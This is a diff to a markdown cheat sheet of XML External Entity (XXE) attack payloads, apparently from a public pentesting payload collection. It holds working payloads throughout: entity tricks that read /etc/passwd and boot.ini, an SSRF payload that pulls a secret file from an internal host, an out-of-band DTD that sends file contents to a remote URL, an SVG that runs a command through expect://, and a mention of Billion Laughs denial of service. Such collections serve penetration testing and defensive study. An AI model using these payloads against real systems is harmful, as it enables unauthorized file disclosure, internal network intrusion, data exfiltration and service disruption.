@@ -11,12 +11,20 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 ## Summary
 
 - [Tools](#tools)
-- [Exploit](#exploit)
-- [Basic XXE](#basic-xxe)
+- [Detect the vulnerability](#detect-the-vulnerability)
+- [Read file content](#read-file-content)
 - [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
+- [XXE to SSRF](#xxe-to-ssrf)
 - [Deny of service](#deny-of-service)
 - [Blind XXE - Out of Band](#blind-xxe---out-of-Band)
+  - [Blind XXE](#blind-xxe)
+  - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
+  - [XXE OOB with DTD and PHP filter](#xxe-oob-with-dtd-and-php-filter)
+  - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)
 - [XXE in exotic files](#xxe-in-exotic-files)
+  - [XXE inside SVG](#xxe-inside-svg)
+  - [XXE inside SOAP](#xxe-inside-soap)
+  - [XXE inside DOCX file](#xxe-inside-docx-file)
 
 ## Tools
 
@@ -25,7 +33,7 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555
   ```
 
-## Exploit
+## Detect the vulnerability
 
 Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.
 
@@ -40,7 +48,7 @@ Basic entity test, when the XML parser parses the external entities the result s
 
 It might help to set the `Content-Type: application/xml` in the request when sending XML payload to the server.
 
-## Basic XXE
+## Read file content
 
 Classic XXE, we try to display the content of the file `/etc/passwd` 
 
@@ -70,6 +78,16 @@ Classic XXE, we try to display the content of the file `/etc/passwd`
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
 ```
+
+:warning: `SYSTEM` and `PUBLIC` are almost synonym.
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+```
+
 
 Classic XXE Base64 encoded
 
@@ -101,9 +119,23 @@ Classic XXE Base64 encoded
 <foo>&xxe;</foo>
 ```
 
+## XXE to SSRF
+
+XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) to target another service on the network.
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "http://secret.dev.company.com/secret_pass.txt" >
+]>
+<foo>&xxe;</foo>
+```
+
+
 ## Deny of service
 
-**Warning** : These attacks might kill the service or the server, do not use them on the production.
+:warning: : These attacks might kill the service or the server, do not use them on the production.
 
 Billion Laugh Attack
 
@@ -192,9 +224,9 @@ File stored on http://127.0.0.1/dtd.xml
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
 ```
 
-### XXE OOB with Apache Karaf "hot deploy" (CVE-2018-11788)
+### XXE OOB with Apache Karaf
 
-Affected versions:
+CVE-2018-11788 affecting versions:
 
 - Apache Karaf <= 4.2.1
 - Apache Karaf <= 4.1.6
@@ -216,7 +248,8 @@ Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
 ## XXE in exotic files
 
 ### XXE inside SVG
-```
+
+```xml
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
     <image xlink:href="expect://ls"></image>
 </svg>
@@ -273,3 +306,4 @@ GIF (experimental)
 * [XXE in Uber to read local files](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html)
 * [XXE by SVG in community.lithium.com](http://esoln.net/Research/2017/03/30/xxe-in-lithium-community-platform/)
 * [XXE inside SVG](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
+* [Pentest XXE - @phonexicum](https://phonexicum.github.io/infosec/xxe.html)
